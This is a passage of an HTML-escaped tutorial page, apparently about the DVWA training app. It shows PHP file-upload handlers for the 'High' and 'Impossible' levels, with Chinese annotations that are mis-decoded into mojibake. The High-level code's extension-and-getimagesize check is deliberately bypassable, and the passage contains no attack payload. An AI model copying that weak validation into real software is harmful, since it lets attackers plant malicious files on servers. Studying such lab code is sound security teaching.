    &lt;span class=&#34;c1&#34;&gt;// File information
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$uploaded_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strrpos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$uploaded_size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;size&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$uploaded_tmp&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Is it an image?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// å¯¹æ¯”ä¸Šé¢å¤šéªŒè¯äº†æ–‡ä»¶çš„åç¼€å
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;jpg&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;jpeg&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;png&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100000&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;

        
       
        &lt;span class=&#34;c1&#34;&gt;// å‡½æ•°ä¼šé€šè¿‡è¯»å–æ–‡ä»¶å¤´ï¼Œè¿”å›å›¾ç‰‡çš„é•¿ã€å®½ç­‰ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰ç›¸å…³çš„å›¾ç‰‡æ–‡ä»¶å¤´ï¼Œå‡½æ•°ä¼šæŠ¥é”™
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;getimagesize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_tmp&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// å¯ä»¥çœ‹åˆ°ï¼ŒHighçº§åˆ«çš„ä»£ç è¯»å–æ–‡ä»¶åä¸­æœ€åä¸€ä¸ªâ€.â€åçš„å­—ç¬¦ä¸²ï¼ŒæœŸæœ›é€šè¿‡æ–‡ä»¶åæ¥é™åˆ¶æ–‡ä»¶ç±»å‹
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// å› æ­¤è¦æ±‚ä¸Šä¼ æ–‡ä»¶åå½¢å¼å¿…é¡»æ˜¯â€*.jpgâ€ã€â€*.jpegâ€ ã€â€*.pngâ€ä¹‹ä¸€
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// åŒæ—¶ï¼Œgetimagesizeå‡½æ•°æ›´æ˜¯é™åˆ¶äº†ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å¤´å¿…é¡»ä¸ºå›¾åƒç±»å‹
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Can we move the file to the upload folder?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_tmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// No
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// Yes!
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Invalid file
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;impossible&#34;&gt;Impossible&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Upload&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Check Anti-CSRF token
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;checkToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;user_token&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;session_token&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;index.php&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// File information
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$uploaded_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strrpos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$uploaded_size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;size&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$uploaded_type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$uploaded_tmp&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Where are we going to be writing to?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DVWA_WEB_PAGE_TO_ROOT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;hackable/uploads/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;//$target_file   = basename( $uploaded_name, &amp;#39;.&amp;#39; . $uploaded_ext ) . &amp;#39;-&amp;#39;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// MD5 åŠ å¯†
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$target_file&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;uniqid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_name&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$temp_file&lt;/span&gt;     &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ini_get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;upload_tmp_dir&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sys_get_temp_dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ini_get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;upload_tmp_dir&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$temp_file&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;.=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DIRECTORY_SEPARATOR&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;uniqid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_name&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Is it an image?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;jpg&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;jpeg&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;png&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100000&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;image/jpeg&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;image/png&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;getimagesize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_tmp&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;image/jpeg&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$img&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;imagecreatefromjpeg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_tmp&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;imagejpeg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$img&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$temp_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$img&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;imagecreatefrompng&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_tmp&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;imagepng&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$img&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$temp_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;imagedestroy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$img&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Can we move the file to the web root from the temp folder?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;rename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$temp_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;getcwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DIRECTORY_SEPARATOR&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$target_file&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// Yes!
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;&amp;lt;a href=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;target_path}${target_file}&amp;#39;&amp;gt;${target_file&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;/a&amp;gt; succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
